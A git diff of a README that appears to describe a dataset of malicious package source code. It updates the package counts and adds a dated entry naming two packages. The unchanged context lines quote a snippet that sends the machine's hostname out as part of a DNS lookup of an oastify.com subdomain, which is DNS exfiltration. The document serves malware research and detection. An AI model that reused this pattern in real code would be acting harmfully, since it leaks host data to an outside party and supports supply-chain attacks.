@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 10,857 versions of the source code of 9,473 malicious packages.
+This data set includes about 10,863 versions of the source code of 9,475 malicious packages.
 
 ## Dataset Format
 
@@ -1285,6 +1285,11 @@ hostn = socket.gethostname()
 du = f"{sc}.{hostn}.w0xm0b7q0nuax7c67g51kmqwxn3mrdf2.oastify.com"
 socket.gethostbyname(du)
 ```
+
+
+### 28 Aug. 2024
+artifact-lab-3-package-6e10193e [0.3.3, 0.3.4, 0.3.5, 0.3.6, 0.3.7, 0.3.8] <br>
+artifact-lab-3-package-76a351f5 [0.2.0, 0.4.0] <br>
 
 
 ## About the malicious packages detection
